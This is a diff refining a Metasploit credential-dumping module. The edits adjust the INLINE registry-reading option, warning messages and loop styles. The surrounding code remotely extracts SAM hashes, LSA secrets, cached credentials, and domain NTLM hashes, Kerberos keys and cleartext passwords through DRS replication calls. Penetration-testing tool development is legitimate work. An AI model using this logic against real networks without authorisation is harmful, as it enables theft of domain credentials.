@@ -87,7 +87,11 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(445),
-        OptBool.new('INLINE', [ true, 'Use inline technique to read protected keys from the registry remotely without saving the hives to disk', true ])
+        OptBool.new(
+          'INLINE',
+          [ true, 'Use inline technique to read protected keys from the registry remotely without saving the hives to disk', true ],
+          conditions: ['ACTION', 'in', %w[ALL SAM CACHE LSA]]
+        )
       ]
     )
 
@@ -300,7 +304,10 @@ class MetasploitModule < Msf::Auxiliary
 
     cache_infos = windows_reg.cached_infos(nlkm_key)
     if cache_infos.nil? || cache_infos.empty?
-      print_status('No cashed entries')
+      print_warning('No cashed entries.')
+      if datastore['INLINE']
+        print_warning('This might be expected or you can still try again with the `INLINE` option set to false')
+      end
       return
     end
 
@@ -554,6 +561,12 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Dumping LSA Secrets')
 
     lsa_secrets = windows_reg.lsa_secrets(lsa_key)
+    if lsa_secrets.empty?
+      print_warning('No LSA secrets to dump')
+      if datastore['INLINE']
+        print_warning('This might be expected or you can still try again with the `INLINE` option set to false')
+      end
+    end
     lsa_secrets.each do |key, secret|
       print_secret(key, secret)
     end
@@ -847,7 +860,7 @@ class MetasploitModule < Msf::Auxiliary
     dc_infos = dcerpc_client.drs_domain_controller_info(ph_drs, domain_name)
     user_info = {}
     dc_infos.each do |dc_info|
-      users.each do |sid, _name|
+      users.each_key do |sid|
         crack_names = dcerpc_client.drs_crack_names(ph_drs, rp_names: [sid])
         crack_names.each do |crack_name|
           user_record = dcerpc_client.drs_get_nc_changes(
@@ -884,7 +897,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line("\n# NTLM hashes:")
-    user_info.each do |_sid, info|
+    user_info.each_value do |info|
       hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
       full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
       unless report_creds(full_name, hash, **credential_opts)
@@ -912,7 +925,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line("\n# Account Info:")
-    user_info.each do |_sid, info|
+    user_info.each_value do |info|
       print_line("## #{info[:dn]}")
       print_line("- Administrator: #{info[:admin]}")
       print_line("- Domain Admin: #{info[:domain_admin]}")
@@ -936,7 +949,7 @@ class MetasploitModule < Msf::Auxiliary
         "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
       )
     end
-    user_info.each do |_sid, info|
+    user_info.each_value do |info|
       full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
 
       if info[:nt_history].size > 1 || info[:lm_history].size > 1
@@ -956,7 +969,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line("\n# Kerberos keys:")
-    user_info.each do |_sid, info|
+    user_info.each_value do |info|
       full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
 
       if info[:kerberos_keys].nil? || info[:kerberos_keys].empty?
@@ -981,7 +994,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line("\n# Clear text passwords:")
-    user_info.each do |_sid, info|
+    user_info.each_value do |info|
       full_name = "#{domain_name}\\#{info[:username]}"
 
       if info[:clear_text_passwords].nil? || info[:clear_text_passwords].empty?
@@ -1134,18 +1147,14 @@ class MetasploitModule < Msf::Auxiliary
     if ['ALL', 'SAM'].include?(action.name)
       if @winreg
         if datastore['INLINE']
-          print_status('Using `INLINE` technique for SAM. You might want to try without if it fails.')
+          print_status('Using `INLINE` technique for SAM')
           windows_reg = Msf::Util::WindowsRegistry::RemoteRegistry.new(@winreg, name: :sam, inline: true)
         else
           begin
             sam = save_sam
             windows_reg = Msf::Util::WindowsRegistry.parse(sam, name: :sam, root: 'HKLM\\SAM')
           rescue RubySMB::Error::RubySMBError => e
-            if action.name == 'ALL'
-              print_warning("Error when getting SAM hive... skipping ([#{e.class}] #{e}).")
-            else
-              print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
-            end
+            print_error("Error when getting SAM hive ([#{e.class}] #{e})")
           end
         end
 
@@ -1158,25 +1167,24 @@ class MetasploitModule < Msf::Auxiliary
     if ['ALL', 'CACHE', 'LSA'].include?(action.name)
       if @winreg
         if datastore['INLINE']
-          print_status('Using `INLINE` technique for CACHE and LSA. You might want to try without if it fails.')
+          print_status('Using `INLINE` technique for CACHE and LSA')
           windows_reg = Msf::Util::WindowsRegistry::RemoteRegistry.new(@winreg, name: :security, inline: true)
         else
           begin
             security = save_security
             windows_reg = Msf::Util::WindowsRegistry.parse(security, name: :security, root: 'HKLM\\SECURITY')
           rescue RubySMB::Error::RubySMBError => e
-            if action.name == 'ALL'
-              print_warning("Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).")
-            else
-              print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
-            end
+            print_error("Error when getting SECURITY hive ([#{e.class}] #{e})")
           end
         end
 
         if windows_reg
           lsa_key = get_lsa_secret_key(windows_reg, boot_key)
           if lsa_key.nil? || lsa_key.empty?
-            print_status('No LSA key, skip LSA secrets and cached hashes dump')
+            print_warning('No LSA key, skip LSA secrets and cached hashes dump')
+            if datastore['INLINE']
+              print_warning('This might be expected or you can still try again with the `INLINE` option set to false')
+            end
           else
             report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
             if ['ALL', 'LSA'].include?(action.name)
@@ -1185,7 +1193,10 @@ class MetasploitModule < Msf::Auxiliary
             if ['ALL', 'CACHE'].include?(action.name)
               nlkm_key = get_nlkm_secret_key(windows_reg, lsa_key)
               if nlkm_key.nil? || nlkm_key.empty?
-                print_status('No NLKM key (skip cached hashes dump)')
+                print_warning('No NLKM key (skip cached hashes dump)')
+                if datastore['INLINE']
+                  print_warning('This might be expected or you can still try again with the `INLINE` option set to false')
+                end
               else
                 report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
                 dump_cached_hashes(windows_reg, nlkm_key)
